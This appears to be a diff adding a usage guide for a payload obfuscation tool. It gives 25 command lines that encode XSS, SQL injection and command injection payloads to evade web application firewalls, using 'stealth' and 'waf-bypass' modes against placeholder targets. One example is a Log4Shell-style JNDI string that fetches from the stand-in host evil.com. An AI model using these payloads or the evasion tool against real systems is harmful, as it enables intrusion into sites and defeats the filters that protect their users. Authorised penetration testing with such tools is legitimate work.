@@ -1,0 +1,101 @@
+✅ 25 USAGE EXAMPLES
+🔹 1. Raw payload with basic single technique (Base64)
+
+python obfuscator.py --mode single --technique base64 --payload "<script>alert(1)</script>"
+
+🔹 2. Raw payload with UTF-16LE obfuscation
+
+python obfuscator.py --mode single --technique utf16LE --payload "<img src=x onerror=alert(1)>"
+
+🔹 3. Raw payload with Unicode whitespace injection
+
+python obfuscator.py --mode single --technique unicodeWhitespace --payload "<svg onload=alert(1)>"
+
+🔹 4. Burp request file input with JavaScript eval-based payload
+
+python obfuscator.py --mode single --technique evalJs --burp-request ./sample.req
+
+🔹 5. URL input with Stealth XSS use case (combo)
+
+python obfuscator.py --mode combo --xss-usecase stealth --url "https://victim.com/vuln?q=test"
+
+🔹 6. URL list input with broken WAF use case
+
+python obfuscator.py --mode combo --xss-usecase waf-bypass --url-list urls.txt
+
+🔹 7. Raw input with combo: colon trick + char assembly + nesting
+
+python obfuscator.py --mode combo --xss-usecase jndi-style --payload '${jndi:ldap://evil.com/a}'
+
+🔹 8. PHP chr() style encoding
+
+python obfuscator.py --mode single --technique phpChr --payload "<script>alert(1337)</script>"
+
+🔹 9. Deep nesting with hexadecimal byte encoding
+
+python obfuscator.py --mode single --technique hexBytes --payload "<script>alert(1)</script>"
+
+🔹 10. Smart JavaScript function splitting and mangling
+
+python obfuscator.py --mode single --technique jsSplitMangle --payload "<script>alert(1)</script>"
+
+🔹 11. Use --stealth for Ultra Obfuscation
+
+python obfuscator.py --mode combo --xss-usecase stealth --stealth --payload "<svg/onload=alert(1)>"
+
+🔹 12. Using regex-based enhancements
+
+python obfuscator.py --mode combo --xss-usecase stealth --regex-enhance --payload "<img src=x onerror=alert(1)>"
+
+🔹 13. Use template string expression (JS obfuscation)
+
+python obfuscator.py --mode single --technique templateStringExpression --payload "<script>alert(1)</script>"
+
+🔹 14. Use iso2022 escape bypass
+
+python obfuscator.py --mode single --technique iso2022Escapes --payload "<svg onload=alert(1)>"
+
+🔹 15. Use punycode encoding in JS
+
+python obfuscator.py --mode single --technique punycode --payload "<img src=x onerror=alert(1)>"
+
+🔹 16. Combine: ternary + deep nesting + eval
+
+python obfuscator.py --mode combo --xss-usecase deep-eval-js --payload "<script>alert(1)</script>"
+
+🔹 17. Zalgo-style injection
+
+python obfuscator.py --mode single --technique zalgo --payload "<svg/onload=alert(1)>"
+
+🔹 18. Unicode truncation edge-case
+
+python obfuscator.py --mode single --technique unicodeTruncation --payload "<img src=x onerror=alert(1)>"
+
+🔹 19. Command Injection stealth
+
+python obfuscator.py --mode combo --xss-usecase shell-injection --payload "`whoami`"
+
+🔹 20. SQLi payload stealth enhancement
+
+python obfuscator.py --mode combo --xss-usecase sql-injection --payload "' OR 1=1 --"
+
+🔹 21. Minified + encoded XSS payload
+
+python obfuscator.py --mode single --technique jsMinify --payload "<script>alert(1)</script>"
+
+🔹 22. Smart URL obfuscation with malformed URL vector
+
+python obfuscator.py --mode single --technique malformedUrl --url "http://target.com/page?input=abc"
+
+🔹 23. Overlong UTF-8 payload
+
+python obfuscator.py --mode single --technique overlongUTF8 --payload "<script>alert(1)</script>"
+
+🔹 24. SplitJoin logic with nested payload
+
+python obfuscator.py --mode single --technique splitJoin --payload "<script>alert(1)</script>"
+
+🔹 25. Data URL with obfuscation
+
+python obfuscator.py --mode combo --xss-usecase data-url --payload "javascript:alert(1)"
+
